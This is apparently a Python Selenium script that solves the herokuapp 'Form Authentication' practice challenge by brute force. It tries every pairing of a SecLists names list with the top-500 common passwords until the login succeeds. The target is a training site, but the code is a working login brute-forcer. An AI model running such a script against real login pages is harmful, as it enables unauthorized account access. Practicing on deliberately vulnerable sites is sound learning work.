import sys
import itertools
import time
from colorama import Fore
sys.path.append("/home/joannes/Documents/herokuapp-challenges")
from libs.SearchChallenges import *

path_seclists = "/home/joannes/Documents/herokuapp-challenges/seclists"

usernames = []
with open(path_seclists + "/names.txt", "r") as file:
    rows = file.readlines()
    for user in rows:
        formatted_user = user.replace("\n", "")
        usernames.append(formatted_user)

passwords = []
with open(path_seclists + "/10-million-password-list-top-500.txt", "r") as file:
    rows = file.readlines()
    for code in rows:
        formatted_code = code.replace("\n", "")
        passwords.append(formatted_code)

test_herokuapp = SearchChallenges(name_challenge="Form Authentication")
test_herokuapp.browser_configurations()
test_herokuapp.get_page()
test_herokuapp.select_challenges()

driver = test_herokuapp.driver_instance()
challenge_title = driver.find_element(By.TAG_NAME, "h2")
print(f"Testing {challenge_title.text}\n")

authentication_list = list(itertools.product(usernames, passwords))


def elements_for_login():
    username = driver.find_element(By.ID, "username")
    password = driver.find_element(By.ID, "password")
    return username, password


for username_value, password_value in authentication_list:
    username, password = elements_for_login()
    username.send_keys(username_value)
    password.send_keys(password_value)
    login_button = driver.find_element(By.CLASS_NAME, "radius")
    login_button.click()
    authentication_message = driver.find_element(By.ID, "flash").text
    print(f"Trying to access with username {username_value} and password {password_value}")
    if "You logged into a secure area!" in authentication_message:
        print(Fore.GREEN + f"\nAccess with username: '{username_value}' with password: '{password_value}' sucessful!" + Fore.RESET)
        break
    else:
        username, password = elements_for_login()
        username.clear()
        password.clear()

logout_button = driver.find_element(By.XPATH,'/html/body/div[2]/div/div/a')
logout_button.click()
print("\nTest Finished.")

# credits to Daniel Miessler for sharing the seclists on github
